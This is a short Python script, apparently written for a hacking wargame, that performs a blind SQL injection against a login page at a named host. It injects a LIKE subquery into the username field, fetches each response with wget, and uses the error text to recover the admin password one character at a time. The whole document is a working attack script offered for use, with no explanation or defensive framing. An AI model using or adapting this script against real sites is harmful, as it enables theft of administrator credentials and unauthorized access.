#!/usr/bin/python
# Author: Albus Shin
import os

dictionary = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^*();:[{]}\"\|`~=+-_/?.>,<"
matchall = "%25"
pattern = "" 

nosuchuser = "use"
wrongpassword = "wor"
g_nowDictIndex = 0

def changepattern():
	global pattern
	global g_nowDictIndex
	pattern = pattern[:-1] #Cut off the last one character
	g_nowDictIndex += 1 #add up the index of now Dictionary 
	pattern = pattern + dictionary[g_nowDictIndex] # add new character 

def nextbyte():
	global pattern
	global g_nowDictIndex
	g_nowDictIndex = 0
	pattern += dictionary[g_nowDictIndex] 
nextbyte()
while len(pattern) < 16:
	url = 'http://www.adum.com/fortknox/index.php?name=admin%27+AND+%28SELECT+password+FROM+user+WHERE+name%3D%27admin%27%29+LIKE+%22' + pattern + matchall + '%22+OR+name%3D%27&password='
	print 'Trying pattern ' + pattern
	os.system("wget \""+url+"\" -O index -q")
	f = open("index", "r")
	lineList = f.readlines()
	f.close()
	if lineList[-1][-4:-1] == nosuchuser:
		print '"' + pattern + '"' + 'Failure, changing pattern'
		changepattern();
	elif lineList[-1][-4:-1] == wrongpassword:
		print '"' + pattern + '"' + 'Correct, bruteforcing next byte'
		if len(pattern) < 15:
			nextbyte();

print 'The password of "admin" is ' + pattern
